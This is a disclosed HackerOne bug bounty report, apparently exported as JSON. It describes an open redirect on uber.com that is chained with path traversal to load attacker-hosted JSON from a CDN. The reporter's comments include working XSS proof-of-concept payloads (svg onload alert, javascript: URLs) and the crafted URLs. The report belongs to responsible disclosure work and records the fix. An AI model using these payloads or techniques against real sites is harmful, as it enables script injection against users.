{"id":125791,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjU3OTE=","url":"https://hackerone.com/reports/125791","title":"Reflected XSS via Unvalidated / Open Redirect in uber.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-03-24T21:10:58.581Z","submitted_at":"2016-03-24T21:10:58.581Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mdv","url":"/mdv","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-05-09T22:29:33.306Z","bug_reporter_agreed_on_going_public_at":"2016-04-13T08:57:19.286Z","team_member_agreed_on_going_public_at":"2016-05-09T22:29:33.222Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\nTo reproduce this issue, visit this URL: https://www.uber.com/en//example.com/\nThis URL will redirect at [example.com](https://example.com/).","vulnerability_information_html":"\u003cp\u003eHello,\u003cbr\u003e\nTo reproduce this issue, visit this URL: \u003ca title=\"https://www.uber.com/en//example.com/\" href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fen%2F%2Fexample.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.uber.com/en//example.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThis URL will redirect at \u003ca href=\"/redirect?url=https%3A%2F%2Fexample.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eexample.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","original_report_id":null,"original_report_url":null,"attachments":[{"id":81107,"file_name":"Response.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/107/834faa37742f57ab1afaf12dad30d67a30e7ec1f/Response.png?response-content-disposition=attachment%3B%20filename%3D%22Response.png%22%3B%20filename%2A%3DUTF-8%27%27Response.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042241Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=54bb14e31971e4c97669f9c0942ce0d04bb370569ba614a3ecce604da6e98ae8","file_size":13735,"type":"image/png"}],"allow_singular_disclosure_at":"2016-05-13T08:57:19.375Z","allow_singular_disclosure_after":-146085921.6359675,"singular_disclosure_allowed":true,"vote_count":6,"voters":["spam404","painxploiter","dz_samir","fantam1","dyabla","pei"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":870357,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report! I've sent it off to the team involved to look into further. We will keep you updated.","markdown_message":"\u003cp\u003eThanks for the report! I\u0026#39;ve sent it off to the team involved to look into further. We will keep you updated.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-24T23:57:04.353Z","updated_at":"2016-03-24T23:57:04.353Z","actor":{"username":"zacmuber","cleared":false,"url":"/zacmuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/061/637/8ae1b2449b13a6b336fb1e84fed117006320998f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":872996,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Using this Open Redirect I can make [CSS Injection (XSS)](http://blog.innerht.ml/cascading-style-scripting/ \"CSS Injection\"). Here is described this issue #125964.","markdown_message":"\u003cp\u003eUsing this Open Redirect I can make \u003ca title=\"CSS Injection\" href=\"/redirect?url=http%3A%2F%2Fblog.innerht.ml%2Fcascading-style-scripting%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS Injection (XSS)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Here is described this issue \u003ca href=\"/reports/125964\"\u003e#125964\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-27T12:35:33.615Z","updated_at":"2016-03-27T12:35:33.615Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":894035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, using this Open Redirect I can send AJAX request to another resource, and make Cross-Site Scripting.\nVulnerable URL: https://www.uber.com/careers/list/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fx.json/\nWill be uploaded content from this JSON file: https://cdn.shopify.com/s/files/1/1223/5942/files/x.json\n```\n{\"id\":\"9999\",\"title\":\"XSS on Uber.com\",\"overview\":\"\u003csvg onload=\\\"alert('XSS on '+ document.domain)\\\"\u003e\",\"responsibilities\":null,\"qualifications\":null,\"lastUpdated\":\"2016-01-16 06:29 AM\",\"formattedTeam\":\"xss\",\"team\":\"xss\",\"subTeam\":\"xss\",\"formattedLocation\":\"xss\",\"slugs\":{\"team\":\"xss\",\"subTeam\":\"xss\",\"city\":\"xss\",\"country\":\"xss\"},\"city\":\"xss\",\"country\":\"xss\",\"jobUrl\":\"javascript:alert('XSS on '+ document.domain)\",\"normalizedTitle\":\"xss\",\"normalizedContent\":\"xss\"}\n```\nFor XSS i used this payload: `\u003csvg onload=\"alert('XSS on '+ document.domain)\"\u003e`\nCross-Site Scripting work in all browsers.\n","markdown_message":"\u003cp\u003eHello, using this Open Redirect I can send AJAX request to another resource, and make Cross-Site Scripting.\u003cbr\u003e\nVulnerable URL: \u003ca title=\"https://www.uber.com/careers/list/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fx.json/\" href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fcareers%2Flist%2F..%252f..%252fen%252f%252fcdn.shopify.com%252fs%252ffiles%252f1%252f1223%252f5942%252ffiles%252fx.json%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.uber.com/careers/list/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fx.json/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nWill be uploaded content from this JSON file: \u003ca title=\"https://cdn.shopify.com/s/files/1/1223/5942/files/x.json\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F1223%2F5942%2Ffiles%2Fx.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopify.com/s/files/1/1223/5942/files/x.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;id\u0026quot;:\u0026quot;9999\u0026quot;,\u0026quot;title\u0026quot;:\u0026quot;XSS on Uber.com\u0026quot;,\u0026quot;overview\u0026quot;:\u0026quot;\u0026lt;svg onload=\\\u0026quot;alert(\u0026#39;XSS on \u0026#39;+ document.domain)\\\u0026quot;\u0026gt;\u0026quot;,\u0026quot;responsibilities\u0026quot;:null,\u0026quot;qualifications\u0026quot;:null,\u0026quot;lastUpdated\u0026quot;:\u0026quot;2016-01-16 06:29 AM\u0026quot;,\u0026quot;formattedTeam\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;team\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;subTeam\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;formattedLocation\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;slugs\u0026quot;:{\u0026quot;team\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;subTeam\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;city\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;country\u0026quot;:\u0026quot;xss\u0026quot;},\u0026quot;city\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;country\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;jobUrl\u0026quot;:\u0026quot;javascript:alert(\u0026#39;XSS on \u0026#39;+ document.domain)\u0026quot;,\u0026quot;normalizedTitle\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;normalizedContent\u0026quot;:\u0026quot;xss\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor XSS i used this payload: \u003ccode\u003e\u0026lt;svg onload=\u0026quot;alert(\u0026#39;XSS on \u0026#39;+ document.domain)\u0026quot;\u0026gt;\u003c/code\u003e\u003cbr\u003e\nCross-Site Scripting work in all browsers.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-07T14:48:24.743Z","updated_at":"2016-04-07T14:48:24.743Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":83824,"filename":"XSS2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/083/824/d1d101a57a29a7aab63c65efb0318bbb9279bc55/XSS2.png?response-content-disposition=attachment%3B%20filename%3D%22XSS2.png%22%3B%20filename%2A%3DUTF-8%27%27XSS2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042241Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=13106027b20a001919198c61ca3debf1fabb31f0cdd936fed72c3e6d7ca8bba0"},{"id":83823,"filename":"XSS1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/083/823/f53cd608ba64b1d1d39cb07251a7ce31363a383c/XSS1.png?response-content-disposition=attachment%3B%20filename%3D%22XSS1.png%22%3B%20filename%2A%3DUTF-8%27%27XSS1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042241Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=2135dd0f9424d2c4d7c12454b480fde6e1b2df129964d64121f9b1c59161905e"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":894676,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cross-Site Scripting is not produced. Very fast fix.","markdown_message":"\u003cp\u003eCross-Site Scripting is not produced. Very fast fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-07T19:16:33.784Z","updated_at":"2016-04-07T19:16:33.784Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":894853,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I found a similar XSS vector.\nVulnerable URL: https://www.uber.com/es/cities/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fc.json/\nWill be uploaded content from this JSON file: https://cdn.shopify.com/s/files/1/1223/5942/files/c.json\n```\n{\"products\":[{\"productDisplayType\":\"uberx\",\"fare\":{\"safeRideFee\":\"USD9999.99\",\"perMinute\":\"USD9999.99\",\"minimum\":\"USD9999.99\",\"cancellation\":\"USD9999.99\",\"fareType\":\"time_plus_distance\",\"base\":\"USD9999.99\",\"isDistanceUnitMetric\":false,\"perDistanceUnit\":\"USD9999.99\",\"additionalFees\":[]},\"displayName\":\"uberX\",\"tagline\":\"XSS\",\"taxiFareInfo\":false,\"finePrint\":[\"XSS\"]},{\"productDisplayType\":\"uberxl\",\"fare\":{\"safeRideFee\":\"USD9999.99\",\"perMinute\":\"USD9999.99\",\"minimum\":\"USD9999.99\",\"cancellation\":\"USD9999.99\",\"fareType\":\"time_plus_distance\",\"base\":\"USD9999.99\",\"isDistanceUnitMetric\":false,\"perDistanceUnit\":\"USD9999.99\",\"additionalFees\":[]},\"displayName\":\"uberXL\",\"tagline\":\"XSS\",\"taxiFareInfo\":false,\"finePrint\":[\"XSS\"]}],\"flatRates\":[],\"id\":9999,\"cityId\":9999,\"flatRateDisplayNames\":[],\"geoJson\":null,\"geoPoint\":{\"latitude\":33.951252,\"longitude\":-83.382943},\"slug\":\"xss\",\"twitterHandle\":null,\"theme\":{\"name\":\"united_states\",\"ctaColor\":\"#57AD57\",\"patternColor\":\"#4DB5D9\",\"patternColorBackground\":\"#A6DAEC\"},\"rideContent\":\"XSS\",\"driveContent\":\"XSS\",\"impactContent\":\"XSS\",\"name\":\"\u003cmarquee\u003eXSS\u003c/marquee\u003e\u003csvg onload=\\\"alert('XSS on '+ document.domain)\\\"\u003e\",\"pageTitle\":\"XSS\",\"pageDescription\":\"XSS\",\"productLegalNotice\":null,\"pageConfiguration\":{}}\n```\nWork in all browsers.","markdown_message":"\u003cp\u003eI found a similar XSS vector.\u003cbr\u003e\nVulnerable URL: \u003ca title=\"https://www.uber.com/es/cities/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fc.json/\" href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fes%2Fcities%2F..%252f..%252fen%252f%252fcdn.shopify.com%252fs%252ffiles%252f1%252f1223%252f5942%252ffiles%252fc.json%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.uber.com/es/cities/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fc.json/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nWill be uploaded content from this JSON file: \u003ca title=\"https://cdn.shopify.com/s/files/1/1223/5942/files/c.json\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F1223%2F5942%2Ffiles%2Fc.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopify.com/s/files/1/1223/5942/files/c.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;products\u0026quot;:[{\u0026quot;productDisplayType\u0026quot;:\u0026quot;uberx\u0026quot;,\u0026quot;fare\u0026quot;:{\u0026quot;safeRideFee\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;perMinute\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;minimum\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;cancellation\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;fareType\u0026quot;:\u0026quot;time_plus_distance\u0026quot;,\u0026quot;base\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;isDistanceUnitMetric\u0026quot;:false,\u0026quot;perDistanceUnit\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;additionalFees\u0026quot;:[]},\u0026quot;displayName\u0026quot;:\u0026quot;uberX\u0026quot;,\u0026quot;tagline\u0026quot;:\u0026quot;XSS\u0026quot;,\u0026quot;taxiFareInfo\u0026quot;:false,\u0026quot;finePrint\u0026quot;:[\u0026quot;XSS\u0026quot;]},{\u0026quot;productDisplayType\u0026quot;:\u0026quot;uberxl\u0026quot;,\u0026quot;fare\u0026quot;:{\u0026quot;safeRideFee\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;perMinute\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;minimum\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;cancellation\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;fareType\u0026quot;:\u0026quot;time_plus_distance\u0026quot;,\u0026quot;base\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;isDistanceUnitMetric\u0026quot;:false,\u0026quot;perDistanceUnit\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\u0026quot;additionalFees\u0026quot;:[]},\u0026quot;displayName\u0026quot;:\u0026quot;uberXL\u0026quot;,\u0026quot;tagline\u0026quot;:\u0026quot;XSS\u0026quot;,\u0026quot;taxiFareInfo\u0026quot;:false,\u0026quot;finePrint\u0026quot;:[\u0026quot;XSS\u0026quot;]}],\u0026quot;flatRates\u0026quot;:[],\u0026quot;id\u0026quot;:9999,\u0026quot;cityId\u0026quot;:9999,\u0026quot;flatRateDisplayNames\u0026quot;:[],\u0026quot;geoJson\u0026quot;:null,\u0026quot;geoPoint\u0026quot;:{\u0026quot;latitude\u0026quot;:33.951252,\u0026quot;longitude\u0026quot;:-83.382943},\u0026quot;slug\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;twitterHandle\u0026quot;:null,\u0026quot;theme\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;united_states\u0026quot;,\u0026quot;ctaColor\u0026quot;:\u0026quot;#57AD57\u0026quot;,\u0026quot;patternColor\u0026quot;:\u0026quot;#4DB5D9\u0026quot;,\u0026quot;patternColorBackground\u0026quot;:\u0026quot;#A6DAEC\u0026quot;},\u0026quot;rideContent\u0026quot;:\u0026quot;XSS\u0026quot;,\u0026quot;driveContent\u0026quot;:\u0026quot;XSS\u0026quot;,\u0026quot;impactContent\u0026quot;:\u0026quot;XSS\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;\u0026lt;marquee\u0026gt;XSS\u0026lt;/marquee\u0026gt;\u0026lt;svg onload=\\\u0026quot;alert(\u0026#39;XSS on \u0026#39;+ document.domain)\\\u0026quot;\u0026gt;\u0026quot;,\u0026quot;pageTitle\u0026quot;:\u0026quot;XSS\u0026quot;,\u0026quot;pageDescription\u0026quot;:\u0026quot;XSS\u0026quot;,\u0026quot;productLegalNotice\u0026quot;:null,\u0026quot;pageConfiguration\u0026quot;:{}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWork in all browsers.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-07T20:43:31.775Z","updated_at":"2016-04-07T20:43:31.775Z","actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":83902,"filename":"XSS3.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/083/902/c034ecaaa2d343bea09920fd9ffa30159cd78e81/XSS3.png?response-content-disposition=attachment%3B%20filename%3D%22XSS3.png%22%3B%20filename%2A%3DUTF-8%27%27XSS3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042241Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1